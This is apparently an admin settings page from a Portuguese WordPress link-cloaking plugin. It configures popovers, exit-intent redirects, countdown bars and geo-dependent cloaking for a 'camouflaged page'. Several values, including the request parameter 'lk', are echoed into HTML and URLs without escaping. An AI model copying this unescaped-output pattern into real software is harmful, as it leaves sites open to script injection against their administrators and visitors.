              <label id="label_p_popover_textarea">Coloque o código html, vídeo ou imagem para ser exibida na página Camuflada no PopOver (Fancybox): </label>
                              
              
               <div class="row" id="p_popover_textarea">

                             
              	 <div class="col-xs-6">
              <?php
			  $valor_popup_camuflagem = $link["popup_camuflagem"];
              $settings = array('textarea_name'=>'popup_camuflagem','editor_height'=>'350');
			  wp_editor( $valor_popup_camuflagem, 'popupcamuflagem',$settings );
			  ?>
                 </div>
			                
              </div>
			 
             
                <div class="row" id="p_controle_popover">
                
                 <div class="col-xs-2">
                 <label>Exibir PopOver Automaticamente?</label> 
                 </div> 
                 
                 <div class="col-xs-1">
                 <select name="abrir_automatic" class="form-control" onchange="javascript:exibir_ocultar_abrir_automatic(this.value);" id="abrir_automatic">
                    	<option value="0" <?php selected("0",$link["abrir_automatic"]);?>>Sim</option>
                        <option value="1" <?php selected("1",$link["abrir_automatic"]);?>>Não</option>
                    </select>
                 </div>
                 <div class="col-xs-1">   
                    <label id="label_apos">após</label>
                  </div>
                  <div class="col-xs-1">
                     <input type="text" size="3" value="<?php echo $link["segundos_apos_popup"];?>" name="segundos_apos_popup" id="segundos_apos_popup" class="form-control" /> 
                    </div>
                    <div class="col-xs-7">
                    <label id="label_segundos">segundos</label>
                    </div>
                  </div>
               
                    
  
				<hr />
				<label id="label_p_imagem_banner">Url da Imagem do Banner</label>
                <div class="row" id="p_imagem_banner">
                 
                
                    <div class="col-xs-3">
                     <input type="text" value="<?php echo $link["url_automatic"];?>" name="url_automatic" id="url_automatic" class="form-control" /> 
                     
              
                    </div>
                    <div class="col-xs-7">
                    <input type="button" name="upload-btn2" id="upload-btn2" class="btn btn-success btn-sm" value="Upload Image">
                    </div>
             
                                   
                </div>     
                
                <div class="row" id="p_posicao_imagem"> 
                	<p>
                	<div class="col-xs-1" >         

                 <label>posição</label> 
                 	</div>
                    <div class="col-xs-3">
                <select name="posicao_imagem_link" class="form-control">
                    	<option value="0" <?php selected("0", $link["posicao_imagem_link"]);?>>Topo à Esquerda</option>
                        <option value="1" <?php selected("1", $link["posicao_imagem_link"]);?>>Topo à Direita</option>
                        <option value="2" <?php selected("2", $link["posicao_imagem_link"]);?>>Rodapé à Esquerda</option>
                        <option value="3" <?php selected("3", $link["posicao_imagem_link"]);?>>Rodapé à Direita</option>
                    </select> 
                    </div>
                    </p>
               </div>

                  
                 <div class="row" id="p_acao_banner">
                 <p>
                 
                 <div class="col-xs-2">   
                 <label>Exibir Banner após</label>
                 </div>
                 <div class="col-xs-1"> 
                 <input type="text" size="3" value="<?php echo $link["segundos_apos_banner"];?>" name="segundos_apos_banner" class="form-control" /> 
				 </div>
                 <div class="col-xs-9">
                 	<label>segundos</label>
                 </div>
                 
                 </p>
                 </div>
                 
                
                <div class="row" id="p_link_banner">
                <div class="col-xs-1">   
                 <label>Link do Banner</label>
                 </div>
                 <div class="col-xs-11"> 
                 <input type="text" value="<?php echo $link["link_banner"];?>" name="link_banner" id="link_banner" class="form-control" /> 
                 </div>
                 </div>

                 
                 
			</div><!--end of well-->
            
            <hr />
            
            <div class="well">
            
                <label>O que Fazer na Intenção de Sair?</label> 
                <select name="ativar_intenc_sair" class="form-control" onchange="javascript:exibir_ocultar_intencao_sair(this.value);" id="ativar_intenc_sair">
                    	
                        <option value="0" <?php selected('0',$link["ativar_intenc_sair"]);?>>Inativo</option>
                        <option value="1" <?php selected('1',$link["ativar_intenc_sair"]);?>>Exibir Banner PopOver</option>
                        <option value="2" <?php selected('2',$link["ativar_intenc_sair"]);?>>Redirecionar para outro URL</option>
                        
                    </select>
                <br />
                

              <label id="label_intenc_sair">Crie a Mensagem para ser exibida na Intenção de Sair: </label>
                              
              
               <div class="row" id="intenc_sair_textarea">

                             
              	 <div class="col-xs-6">
              <?php
			  $valor_popup_camuflagem = $link["pop_intenc_sair"];
              $settings = array('textarea_name'=>'pop_intenc_sair','editor_height'=>'350');
			  wp_editor( $valor_popup_camuflagem, 'popintencsair',$settings );
			  ?>
                 </div>
			                
              </div>
              
              <label id="label_intenc_sair_redirect">Informe o URL para Redirecionar na Intenção de Sair: </label>
                              
              
               <div class="row" id="intenc_sair_textarea">

                             
              	 <div class="col-xs-6">
					<input type="text" name="url_intenc_sair" id="url_intenc_sair" value="<?php echo $link["url_intenc_sair"];?>" class="form-control" />
                 </div>
			                
              </div>              
              
                                          
            </div>
            
        </div>
        </div>
        </div>
        
        
        
        
           <div class="panel panel-danger">
            <div class="panel-heading">
              <h3 class="panel-title">
			  <a class="accordion-toggle collapsed" data-toggle="collapse" data-parent="#accordion" href="#collapseBotoes">Botões de Compartilhamento da Página Camuflada</a>
              </h3>
            </div>
            <div id="collapseBotoes" class="panel-collapse collapse">
            <div class="panel-body">
            
            
            	<div class="well">

                <p>
				<label>Exibir Botões de Compartilhamento</label>
                <select name="ativar_share" class="form-control">
                		<option value="0" <?php if($link["ativar_share"] ==0) echo ' selected="selected"';?>>Desativado</option>
                    	<option value="1" <?php if($link["ativar_share"] ==1) echo ' selected="selected"';?>>Exibir do Lado Esquerdo</option>
                        <option value="2" <?php if($link["ativar_share"] ==2) echo ' selected="selected"';?>>Exibir do Lado Direito</option>
                    </select>
                    
                </p>
                                
                
                <h3>Marque o Modelo dos Botões Desejado?</h3>
                                
                <p>
                
                 <input type="radio" name="share_gif" <?php if($share_gif ==0) echo 'checked="checked"';?>  value="0" class="form-control" > <img src="<?php echo $anderson_makiyama[self::PLUGIN_ID]->plugin_url;?>images/whatsapp.png" /> <img src="<?php echo $anderson_makiyama[self::PLUGIN_ID]->plugin_url;?>images/facebook.png" /> <img src="<?php echo $anderson_makiyama[self::PLUGIN_ID]->plugin_url;?>images/twitter.png" /> <img src="<?php echo $anderson_makiyama[self::PLUGIN_ID]->plugin_url;?>images/google.png" />
                                                 	
                </p>
 
                <p>

                 <input type="radio" name="share_gif" <?php if($share_gif ==1) echo 'checked="checked"';?>  value="1" class="form-control" > <img src="<?php echo $anderson_makiyama[self::PLUGIN_ID]->plugin_url;?>images/whatsapp2.png" /> <img src="<?php echo $anderson_makiyama[self::PLUGIN_ID]->plugin_url;?>images/facebook2.png" /> <img src="<?php echo $anderson_makiyama[self::PLUGIN_ID]->plugin_url;?>images/twitter2.png" /> <img src="<?php echo $anderson_makiyama[self::PLUGIN_ID]->plugin_url;?>images/google2.png" />

                </p>
            
                     
                <p>
                 <input type="radio" name="share_gif" <?php if($share_gif ==2) echo 'checked="checked"';?>  value="2" class="form-control" > <img src="<?php echo $anderson_makiyama[self::PLUGIN_ID]->plugin_url;?>images/whatsapp3.png" /> <img src="<?php echo $anderson_makiyama[self::PLUGIN_ID]->plugin_url;?>images/facebook3.png" /> <img src="<?php echo $anderson_makiyama[self::PLUGIN_ID]->plugin_url;?>images/twitter3.png" /> <img src="<?php echo $anderson_makiyama[self::PLUGIN_ID]->plugin_url;?>images/google3.png" />               

             
				</p>
                                 
               
               </div>

        </div>
        </div>
        </div>
        


           <div class="panel panel-danger">
            <div class="panel-heading">
              <h3 class="panel-title">
			  <a class="accordion-toggle collapsed" data-toggle="collapse" data-parent="#accordion" href="#collapseTopBar">Barra do Topo da Página Camuflada</a>
              </h3>
            </div>
            <div id="collapseTopBar" class="panel-collapse collapse">
            <div class="panel-body">
            
            
            	<div class="well">
                <p>
                <div class="row">
                	<div class="col-xs-3">
                 <input type="checkbox" name="ativar_barra" class="form-control" <?php if($link["ativar_barra"] ==1) echo 'checked="checked"';?>> <label>Ativar Barra no Topo da Página?</label>
					</div>
                	<div class="col-xs-1">	
                <label>Cor #: </label>
                	</div>
                	<div class="col-xs-1">
					<input type="text" name="cor_barra" value="<?php echo $link["cor_barra"];?>" class="color form-control" />
					</div>
                </div>
                
                </p>                
                <p>
                
                
                <div class="row">
                	<div class="col-xs-3">
               			 <input type="checkbox" name="ativar_contador" class="form-control" <?php if($link["ativar_contador"] ==1) echo 'checked="checked"';?>> <label>Exibir Contador Regressivo com</label>
                	</div>
                    <div class="col-xs-1">
                    	<input type="number" name="tempo_contador" value="<?php echo $link["tempo_contador"];?>" class="form-control" />
                    </div>
                    <div class="col-xs-2">
                    	<label>Minutos restantes</label>

                <a class="popoverData" class="btn" href="javascript::" data-content="Para Obter o tempo em Horas multiplique as horas por 60. Por exemplo, para duas horas, multiplique 60x2 e digite o valor 120" rel="popover" data-placement="bottom" data-original-title="Minutos Restantes" data-trigger="hover"><span class="glyphicon glyphicon-info-sign"></span></a>
                    </div>
                    <div class="col-xs-1">	
                <label>Cor #: </label>
                	</div>
                    <div class="col-xs-1">
					<input type="text" name="cor_contador" value="<?php echo $link["cor_contador"];?>" class="color form-control" />
					</div>
                    
               </div>
                
                </p>                 
                <p>
                <div class="row">
                	<div class="col-xs-2">
                <label>Texto da Barra: </label>
                	</div>
                	<div class="col-xs-3">
				<input type="text" name="texto_barra" value="<?php echo $link["texto_barra"];?>" class="form-control" />
					</div>
                	<div class="col-xs-1">	
                <label>Cor #: </label>
                	</div>
                	<div class="col-xs-1">
					<input type="text" name="cor_texto_barra" value="<?php echo $link["cor_texto_barra"];?>" class="color form-control" />
					</div>
                </div>
                
                </p>
                 
                <p>
                <div class="row">
                	<div class="col-xs-2">
                <label>Texto do Botão: </label>
                	</div>
                	<div class="col-xs-3">
				<input type="text" name="texto_botao" value="<?php echo $link["texto_botao"];?>" class="form-control" />
					</div>
                	<div class="col-xs-1">	
                <label>Cor #: </label>
                	</div>
                	<div class="col-xs-1">
					<input type="text" name="cor_texto_botao" value="<?php echo $link["cor_texto_botao"];?>" class="color form-control" />
					</div>
                </div>
                
                </p>

                <p>
                <div class="row">
                	<div class="col-xs-2">
                <label>Link (URL) do Botão: </label>
                	</div>
                	<div class="col-xs-3">
				<input type="text" name="link_botao" value="<?php echo $link["link_botao"];?>" class="form-control" />
					</div>
                	<div class="col-xs-2">	
                <label>Cor de Fundo do Botão #: </label>
                	</div>
                	<div class="col-xs-1">
					<input type="text" name="cor_botao" value="<?php echo $link["cor_botao"];?>" class="color form-control" />
					</div>
                </div>
                
                </p>                     


               <p>
                <div class="row">
                	<div class="col-xs-3">
                    <label>Exibir Barra Após: </label>
                    </div>
                    <div class="col-xs-3">
                    <input type="number" name="tempo_barra" value="<?php echo $link["tempo_barra"];?>" class="form-control" />
                    </div>
                	<div class="col-xs-3">
                    <label>Segundos </label>
                    </div>              
                          
                </div>
               </p>
                                
               
               </div>

        </div>
        </div>
        </div>
        
        
           <div class="panel panel-danger">
            <div class="panel-heading">
              <h3 class="panel-title">
              <a class="accordion-toggle collapsed" data-toggle="collapse" data-parent="#accordion" href="#collapseFive">
              Criação Automática de Links
              </a>
              </h3>
            </div>
            <div id="collapseFive" class="panel-collapse collapse">
           
            <div class="well">
            <div class="panel-body">
                         
                 <p>
                 
                
                <div class="row">
                	<div class="col-xs-2">
                <label>Criar Links Automaticamente:</label>
                	</div>
                    <div class="col-xs-2">
                <select name="auto_create" class="form-control">
                    	<option value="0" <?php selected("0", $link["auto_create"]);?>>Não</option>
                        <option value="1" <?php selected("1", $link["auto_create"]);?>>Sim</option>
                    </select>
                    </div>
					<div class="col-xs-2">
                    <label>Palavra/Frase que Virará Link:</label> 
                	</div>
                    <div class="col-xs-2">
                <input type="text" name="auto_create_palavra" value="<?php echo $link["auto_create_palavra"];?>" class="form-control" />
                	</div>
                </div>
                 
                 <p>
                 <div class="row">   
                    <div class="col-xs-2">
                    <label>Limite de Links por Página:</label> 
                	</div>
                    <div class="col-xs-10">
                	<select name="max_replaces" class="form-control">
                    	<option value="1" <?php selected("1", $link["max_replaces"]);?>>1</option>
                        <option value="2" <?php selected("2", $link["max_replaces"]);?>>2</option>
                        <option value="3" <?php selected("3", $link["max_replaces"]);?>>3</option>
                        <option value="4" <?php selected("4", $link["max_replaces"]);?>>4</option>
                        <option value="5" <?php selected("5", $link["max_replaces"]);?>>5</option>
                        <option value="6" <?php selected("6", $link["max_replaces"]);?>>6</option>
                        <option value="7" <?php selected("7", $link["max_replaces"]);?>>7</option>
                        <option value="8" <?php selected("8", $link["max_replaces"]);?>>8</option>
                        <option value="9" <?php selected("9", $link["max_replaces"]);?>>9</option>
                        <option value="10" <?php selected("10", $link["max_replaces"]);?>>10</option>
                    </select>
                    </div>
                 </div>
			    </p>

		        
				<div class="row">
                <p>
                <div class="col-xs-3">
               <label>Exibir Popup quando passar o Mouse?</label>
				</div>
                <div class="col-xs-9">
                	<select name="popup" class="form-control">
                    	<option value="0" <?php selected("0",$link["popup"]);?>>Não</option>
                        <option value="1" <?php selected("1",$link["popup"]);?>>Sim</option>
                    </select>
                </div>
                </p>
               </div>
               
               <div class="row">
               <p>
               <div class="col-xs-4">     
            	<br />
              <label>Texto, Imagens, Códigos HTML para serem exibidos no Popup:</label> 
              </div>
              <div class="col-xs-8">     
              <textarea name="popup_code" class="form-control"><?php echo $link["popup_code"];?></textarea>
              </div>
              </p>
              </div>


          
					</div><!--end of well-->
                </p>
                
			</div>
		</div>

        </div>
        
 				<p>
                <br />

               <button type="submit" name="submit" class="btn btn-danger btn-sm"><i class="glyphicon glyphicon-refresh"></i> Atualizar</button> <a href="<?php echo $admin_url?>_Links&lkdel=<?php echo $_REQUEST["lk"]?>" class="btn btn-danger btn-sm"><i class="glyphicon glyphicon-remove"></i> Excluir</a> <a href="<?php echo $admin_url . "&copy=" . $_REQUEST["lk"]?>" class="button-secondary" ><i class="glyphicon glyphicon-duplicate"></i> Clonar</a>

				</p>        
 		</form>




<hr />

</div> <!--End of Panel Accordion-->


</div> <!--end of div wrap-->

<?php require("author.php");?>


<script type="text/javascript">
jQuery(document).ready(function($){
    $('#upload-btn').click(function(e) {
        e.preventDefault();
        var image = wp.media({ 
            title: 'Upload Image',
            // mutiple: true if you want to upload multiple files at once
            multiple: false
        }).open()
        .on('select', function(e){
            // This will return the selected image from the Media Uploader, the result is an object
            var uploaded_image = image.state().get('selection').first();
            // We convert uploaded_image to a JSON object to make accessing it easier
            // Output to the console uploaded_image
            console.log(uploaded_image);
            var image_url = uploaded_image.toJSON().url;
            // Let's assign the url value to the input field
            $('#image_url').val(image_url);
        });
    });
	
    $('#upload-btn2').click(function(e) {
        e.preventDefault();
        var image = wp.media({ 
            title: 'Upload Image',
            // mutiple: true if you want to upload multiple files at once
            multiple: false
        }).open()
        .on('select', function(e){
            // This will return the selected image from the Media Uploader, the result is an object
            var uploaded_image = image.state().get('selection').first();
            // We convert uploaded_image to a JSON object to make accessing it easier
            // Output to the console uploaded_image
            console.log(uploaded_image);
            var image_url = uploaded_image.toJSON().url;
            // Let's assign the url value to the input field
            $('#url_automatic').val(image_url);
        });
    });
	
    $('#upload-btn-turbo').click(function(e) {
        e.preventDefault();
        var image = wp.media({ 
            title: 'Upload Image',
            // mutiple: true if you want to upload multiple files at once
            multiple: false
        }).open()
        .on('select', function(e){
            // This will return the selected image from the Media Uploader, the result is an object
            var uploaded_image = image.state().get('selection').first();
            // We convert uploaded_image to a JSON object to make accessing it easier
            // Output to the console uploaded_image
            console.log(uploaded_image);
            var image_url = uploaded_image.toJSON().url;
            // Let's assign the url value to the input field
            $('#turbo_img').val(image_url);
        });
    });		
	
	$('#dedata').datetimepicker({value:'<?php echo $de_data;?>', format: 'd/m/Y H:i'});
	$('#atedata').datetimepicker({value:'<?php echo $ate_data;?>', format: 'd/m/Y H:i'});	
		
});
window.onload = function(){
	jQuery('.popoverData').popover();
	jQuery('#popoverOption').popover({ trigger: "hover" });
	
	exibir_ocultar_checkbox('ativar_rastreio_cookie','ultima_origem');
	exibir_ocultar_checkbox('ck_parametros','atv_rastreio');
	
	exibir_ocultar_controle(jQuery("#ativar_automatic").val());
	exibir_ocultar_abrir_automatic(jQuery("#abrir_automatic").val());
	
	exibir_ocultar_intencao_sair(jQuery("#ativar_intenc_sair").val());	
	
	exibir_ocultar_periodo(jQuery("#exibir_periodo").val());


	exibir_ocultar_class('d_redirect_clique',jQuery("#redirect_clique").val(),'1');
	exibir_ocultar_class('d_segundo_acesso',jQuery("#redirect_segundo").val(),'1');
	
	exibir_ocultar_class('d_turbo_url',jQuery("#ativar_turbo").val(),'1');
	exibir_ocultar('d_redirect_clique',jQuery("#ativar_turbo").val(),'1');
	exibir_ocultar('d_segundo_acesso',jQuery("#ativar_turbo").val(),'1');
	exibir_ocultar('d_segundo_apos_turbo',jQuery("#ativar_turbo").val(),'1');
	exibir_ocultar('d_tipo_modo',jQuery("#ativar_turbo").val(),'1');
	
	
	exibir_ocultar('url_no_br',jQuery("#acao_cloak_br").val(),'0,1,2,3');
	exibir_ocultar('url_fora_br',jQuery("#acao_cloak_fora_br").val(),'0,1,2,3');
		
}

function exibir_ocultar_abrir_automatic(valor_atual){

	switch(valor_atual){
	
		case '1':
		
			jQuery('#label_apos').hide();
			jQuery('#segundos_apos_popup').hide();
			jQuery("#label_segundos").hide();
			
		break;
		case '0':
		
			jQuery('#label_apos').show();
			jQuery('#segundos_apos_popup').show();
			jQuery("#label_segundos").show();
		
		break;
	
		
	}
}

function exibir_ocultar_periodo(valor_atual){

	switch(valor_atual){
	
		case '0':
		
			jQuery("#periodo_url").hide();
			jQuery('#periodo_div').hide();
			
		break;
		default:
		
			jQuery("#periodo_url").show();
			jQuery('#periodo_div').show();
		break;
	
		
	}
}

function exibir_ocultar_intencao_sair(valor_atual){

	switch(valor_atual){
	
		case '0':
		
			jQuery('#label_intenc_sair').hide();
			jQuery('#label_intenc_sair_url').hide();
			jQuery('#intenc_sair_textarea').hide();
			jQuery('#url_intenc_sair').hide();
			
		break;
		case '1':
		
			jQuery('#intenc_sair_textarea').show();
			jQuery('#label_intenc_sair').show();
			jQuery('#label_intenc_sair_url').hide();
			jQuery('#url_intenc_sair').hide();
		
		break;
		case '2':
		
			jQuery('#url_intenc_sair').show();
			jQuery('#label_intenc_sair_url').show();
			jQuery('#label_intenc_sair').hide();
			jQuery('#intenc_sair_textarea').hide();
		
		break;		
	
		
	}
}


function exibir_ocultar_controle(valor_atual){

	switch(valor_atual){
	
		case '0':
		
			jQuery('#p_popover_textarea').hide();
				jQuery('#label_p_popover_textarea').hide();
			jQuery("#p_controle_popover").hide();
			jQuery("#p_imagem_banner").hide();
				jQuery("#label_p_imagem_banner").hide();
			jQuery("#p_link_banner").hide();
			jQuery("#p_posicao_imagem").hide();
			jQuery("#p_acao_banner").hide();
			
		break;
		case '1':
		
			jQuery('#p_popover_textarea').show();
				jQuery('#label_p_popover_textarea').show();
			jQuery("#p_controle_popover").show();
			jQuery("#p_imagem_banner").show();
				jQuery("#label_p_imagem_banner").show();
			jQuery("#p_link_banner").hide();
			jQuery("#p_posicao_imagem").show();
			jQuery("#p_acao_banner").show();
		
		break;
		case '2':
			jQuery('#p_popover_textarea').hide();
				jQuery('#label_p_popover_textarea').hide();
			jQuery("#p_controle_popover").hide();

			jQuery("#p_imagem_banner").show();
				jQuery("#label_p_imagem_banner").show();
			jQuery("#p_link_banner").show();
			jQuery("#p_posicao_imagem").show();
			jQuery("#p_acao_banner").show();
					
		break;
		
	}

}


function exibir_ocultar(id,valor_atual,valores_para_exibir){
	my_arr = valores_para_exibir.split(",");
	
	if(jQuery.inArray(valor_atual,my_arr) === -1){
		jQuery("#"+id).hide();
	}else{
		jQuery("#"+id).show();
	}
}
function exibir_ocultar_class(classe,valor_atual,valores_para_exibir){
	my_arr = valores_para_exibir.split(",");
	
	if(jQuery.inArray(valor_atual,my_arr) === -1){
		jQuery("."+classe).hide();
	}else{
		jQuery("."+classe).show();
	}
}
function exibir_ocultar_checkbox(thisid, targetid){
	my_arr = jQuery('#'+thisid).attr('checked');
	
	if(my_arr != "checked"){
		jQuery("#"+targetid).hide();
	}else{
		jQuery("#"+targetid).show();
	}

}
</script>
